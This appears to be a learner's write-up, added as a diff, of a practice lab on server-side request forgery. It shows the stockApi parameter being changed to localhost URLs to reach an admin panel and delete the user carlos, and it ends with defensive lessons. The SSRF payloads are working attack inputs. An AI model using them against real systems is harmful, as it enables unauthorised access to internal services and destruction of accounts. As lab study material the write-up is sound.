@@ -1,0 +1,41 @@
+================================
+LAB: Basic SSRF against the local server
+================================
+
+[LAB INFORMATION]
+-----------------
+Date: January 27, 2026
+Lab URL: https://0ac3009a04c7c19f84242759004400e3.web-security-academy.net
+Category: SSRF
+Level: Apprentice
+Objective: Change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.
+Description: Stock check feature fetches data from an internal system.
+
+[RECONNAISSANCE]
+----------------
+- /product?productId=1 triggers POST /product/stock  
+- stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2F...
+
+[VULNERABILITY DISCOVERY]
+-------------------------
+- stockApi=http://localhost → shop homepage returned
+- No URL validation = SSRF confirmed
+
+[EXPLOITATION]
+--------------
+1. stockApi=http://localhost/admin
+Response: admin panel with users wiener/carlos
+
+2. stockApi=http://localhost/admin/delete?username=carlos  
+Response: HTTP 302 Found → success
+
+[EVIDENCE]
+----------
+- Burp: admin HTML response screenshot
+- Burp: 302 delete + "Solved" status screenshot
+
+[LESSONS LEARNED]
+-----------------
+- Whitelist allowed domains/IPs
+- Block localhost/127.0.0.1/0.0.0.0
+- Burp Repeater = SSRF king
